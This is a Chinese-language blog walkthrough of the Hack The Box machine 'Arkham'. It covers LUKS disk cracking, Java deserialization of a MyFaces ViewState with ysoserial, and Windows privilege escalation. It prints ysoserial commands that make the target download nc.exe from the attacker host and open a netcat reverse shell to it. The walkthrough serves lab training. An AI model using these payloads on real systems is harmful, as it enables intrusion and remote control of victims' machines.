> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/G9yXR9ZawwptrLSzdq2STQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **85** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/176

靶机难度：中级（4.8/10）

靶机发布日期：2019 年 5 月 15 日

靶机描述：

Arkham is a medium difficulty Windows box which needs knowledge about encryption, java deserialization and Windows exploitation. A disk image present in an open share is found which is a LUKS encrypted disk. The disk is cracked to obtain configuration files. The Apache MyFaces page running on tomcat is vulnerable to deserialization but the viewstate needs to encrypted. After establishing a foothold an Outlook OST file is found, which contains a screenshot with a password. The user is found to be in the Administrators group, and a UAC bypass can be performed to gain a SYSTEM shell.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUSdzK3aR7zDeusL8uzEnKibeU6XxflibR9zR8wkujzNy5TU8sMo9wrarw/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.130...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU6x1n1GjKMTnnZmSoIBDicjBuc6BbAIAauqkaTC06GKqvp2hEcgZSgJg/640?wx_fmt=png)

IIS 在端口 80 上与 SMB 和 Apache tomcat 一起在各自的端口上运行着... 还有 49666、49667 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUS3ryTRszk04uO55qQT1a4ADAsH6t55ZibX4Z9nyHgUE8HZkDXRbeiadQ/640?wx_fmt=png)

找到 BatShare 共享，进去看看..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUibKrCaxQoktouC9afGfARn8CIwqria2aSAPibQ8iciaAticsia0rYqvlYLFkw/640?wx_fmt=png)

发现文件 appserver.zip... 好大的文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU2cHzH18F8pO65md5RMfoQe5AP633vYKwnNuS0PJzgcwDdQu3ZC9j5w/640?wx_fmt=png)

网络太差了！！移动的宽带走个代理出去，根本下不动 appserver，我 mount 挂载，还是等待了半天才打开...

更坑爹的是，挂载完 copy 也不行，应该是网络原因，但是操作别的都正常...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUhnXvJHRnSEMaXWNDOyYz2eqvDciaVGozjAPNxGwJt3f6sGWI4JzliarA/640?wx_fmt=png)

非要以这种方式，等了 7 分钟，才完成 14MB 文件的加压~~~

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUeL3WrSdcNJEz8PBhMUeyMjssQaOrx8BEDQqeqHnnS7RWPwqbGmobXw/640?wx_fmt=png)

只是告诉我们这是 Linux 服务器的备份镜像，需要密码登陆... 果然这是 LUKS 加密的图像...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUUUibG0tzq1jVQeWr4p7hSm41WnP85EE9SiaX5hyS1cH6ykOnn8oMDt9g/640?wx_fmt=png)

搜先利用 grep batman /usr/share/wordlists/rockyou.txt > dayu.txt 生成密码库... 因为这台靶机 http 就提及了很多人名...batman 是列举人名的密码库...

然后利用 bruteforce-luks 暴力破解密码的工具进行破解，获得密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU7bXrCk3SSGXYBnnfQicxib2BAsgxU7fWGNRKBV4cnmq0Drc8RtND7ibRg/640?wx_fmt=png)

利用 cryptsetup 解密磁盘内容，输入密码可以看到，桌面生成了一个磁盘，进入是蝙蝠侠电视剧的几张图... 和文件

里面是一些服务器配置文件和几张图，目前没发现别的信息，没密码没用户... 继续往下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUiaM3NsemFdj7tRrYNDwGGjglyzae5ulosIXPsTwia2zT7YQQTdpMicx8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUudaIwImDso3ENzMoAsNImwH5hibaI1iapyb3XTQ7iaib6AL0yL9hJniavdw/640?wx_fmt=png)

80 和 8080 的 web 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU3KnEQiaE2UI4FcUFibdmsxPjcIP2j4jjFBGa5gayhl3NBdveeiazdqYeA/640?wx_fmt=png)

访问 80 端口的 Subscription 订阅信息，重定向到了 userSubscribe.faces 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUO8CIdCoM9Tm2ekemT3icC371g7TXZVLrEpYWibmadTLN62iaz6ReIbXjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU2Cj5Tuu4ofXYlMhcHYd1x73KJLicMyuXwyz07rY8NhN3xpjFiac4qicvw/640?wx_fmt=png)

利用 burp suit 分析页面具有. faces 扩展名，并且 POST 请求具有参数 javax.faces.ViewState...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUWCpZeyCQlEbWiaA0pVI7Ip94YEGRnJf36onNgzWgHh12Cuic7DGTnThw/640?wx_fmt=png)

在前端代码更清晰的看到此 ViewState 属性，这是一种 MyFaces 用于存储视图当前状态的机制，此状态是 Java 序列化的对象，这意味着我们可能必须进行 Java 反序列化攻击。存在的反序列化漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU9AXsWtXp9kobN6FY2AuFSpze24R6pAGibBCsiaqLI8H4AYftHDmia5Z0Q/640?wx_fmt=png)

参考这篇文章可以获得点思路...

```
[java.lang.Object](https://myfaces.apache.org/shared12/myfaces-shared-core/apidocs/org/apache/myfaces/shared/util/StateUtils.html)
```

很好的解释了，这是 base64 编码进行 DES 和 macSHA1 加密的 Java 序列化对象...  

下面的思路是：

找到 DES 和 macSHA1 密匙，然后利用 base64 值进行 javax.faces.ViewState = 注入...base64 可以利用 java 生成 shellcode 转码成 base64 即可提权... 开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUkakBfVUMM2rbwC1bUvD6GBdGwHEEibt3Vk6p0xqGQeSVOQAxcIw5pYA/640?wx_fmt=png)

在前面挂在出的盘里 web.xml.bak 文件发现了 DES 和 macSHA1 密匙...

这里需要利用：

```
[ysoserial](https://github.com/frohoff/ysoserial)
```

集成工具进行生成 jave 反序列化的 shellcode... 功能很多  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUPpzmIQsfwsyJYpuSEK3O3wOmdqRAFFEglFLiabrv1YyAns01rGEFAiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU5uMZzu7Qpc0MTTQXIvmMLsnJTsM0kt5WY1yIL2ibl6L3vWBjmVt2Ficw/640?wx_fmt=png)

准备好了生成 shellcode 的工具...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUhJ28VUiaJa9SmHwendtrZDJAia99aGJuwPwpWcecibSKcRqo9e5licN3og/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU5ibZkNqom91nRse2iaa9NaCCqSZHVoOe3HOGz394ff3BgQDeyYoPEImQ/640?wx_fmt=png)

```
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri "http://10.10.14.11/nc.exe" -OutFile "C:\windows\system32\spool\drivers\color\nc.exe"' > exploit
```

利用 ysoserial 最新版集成生成 shellcode...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU6ksicz4XOAQlg1TumLianV8CdqBSZIVH1GJafvps0mWPBibVicQUlfagkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU2YA2xibmsXMwT1DMficxD4Eicyxqnn1djgLiaImwVSW84T3vqibawvt6DzQ/640?wx_fmt=png)

然后利用 DES 密匙简单的 python 代码生成 base64 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUIfsQMwHibPaeGqiacLWKbDcEDLrBGeXvYl8JxYmDauaHBBibiaQib7fMa4Q/640?wx_fmt=png)

成功注入...NC 上传成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUt3cEztGJicY1sVkt1m9Kx1yBjKtAXkLIyLPqxymwRSzNqJQicsDUiag4g/640?wx_fmt=png)

```
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd.exe /c c:\windows\system32\spool\drivers\color\nc.exe -nv 10.10.14.11 443 -e cmd.exe' > exploit2
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUZxKuZKHz1Q2AsHjgz2tcdNjbGuuQdat9ohoUMuJgwHa50KdvRJq7Jw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU3jzdIicMeSwkLme4uor57FWiaetnhME0yJicH9Kfd0QSnH5C6k6N4IdtQ/640?wx_fmt=png)

按照前面同理，写入 shellcode 出发 nc 即可获得反向外壳...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUKzeN9bnG8Bj4w7MjGgQ7oxxf7gHoYkTWs2icXosXqJErmGb9Fkc592Q/640?wx_fmt=png)

成功获得 user 信息... 这里需要进入 powershell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUrPulHolOCWfUX9wsjaGd1W8HjOtQXGDJmRQNeHm5ZU61XsJ0Sak5iaQ/640?wx_fmt=png)

枚举目录发现在 backups 中 C:\Users\Alfred\Downloads 目录下有一个 zip 文件... 利用 nc 进行下载...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUMVthOboHe6gWuicOQfOqiceg4l6SgDU9iciawpwn1KqpxQqVmRtGXiay4Mg/640?wx_fmt=png)

存档中只有一个 arkham.local.ostOutlook 电子邮件文件，利用 readpst 将其转换...

转换成 Drafts.mbox 文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU4yRv4csd8GP5CutZx9G5kCrY7BV7uc6JUSibZ8X54FXtMoYZicCSA89g/640?wx_fmt=png)

查看 Drafts.mbox 文件，存在 base64 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUMCxUSnH4HNR8fkco2bibicwmP9BEz4PRxleyhGa9yXzlH79SQF9HmtDw/640?wx_fmt=png)

将 base64 转换后，发现这是 png 格式文件.. 修改即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUSKD6rk5gdO7pMLxFodVhP0EeoajIoRn3jb8Sbk0DsAISDSM9Xo5GYA/640?wx_fmt=png)

查看后发现了 Batman 的密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUObIWbqHb7owgyREibicy5yiasE0rP03K1aBCoaiceC0Hnhlhy7wibEhTf4Q/640?wx_fmt=png)

可以看到 Batman 用户在 Administrators 组以及 Remote management users 组中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVU5HLOY0PUJGMp7yKGqf67UTuDhAIdKPTFA52JwvBcFnmYQhoagUHmsg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUneCjiaurHficeaskcU9GAcGb8Mbk95EITkONqkoJtXnHog7aRdibmIfvg/640?wx_fmt=png)

利用 PowerShell Remoting 使用他的凭据，成功进入 PowerShell 会话，然后利用原先上传的 NC 获得了反向 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUaIO4wlFE8PibeTF8l3bibbz6SicgUh95YemXickPuYqAOWHgianUibaiaibIqQ/640?wx_fmt=png)

直接读取 root 信息无法查看... 前面查看信息是在 adminidtrator 组里，我进行了挂在共享... 成功

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPOdlxic4DONJlJcYQiaPeiaVUnCcQjlOlZMic9TJ4YzEEG2lFaUPGCyAPYIEtOFdDAYL9SrM1eZ73Qjg/640?wx_fmt=png)

通过挂在的 E 盘，成功获得了 root 信息...

![](https://mmbiz.qpic.cn/sz_mmbiz_png/0cJxJdTeNgYmBxrqznNuicqBJXAnca9Sia5lw88xHj4O1j9nO8s5O484VI3HTMkaickZrAdRiboQOuYltpTibrXTn7Q/640?wx_fmt=png)

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/KzuCxpxs7oCB12IBPzSEmAib10AOjpmlWVZL5v1vUictokJWicLLBhqOXU7BPEGlda1qVTXElPiabEJqY3xXaqId6Q/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)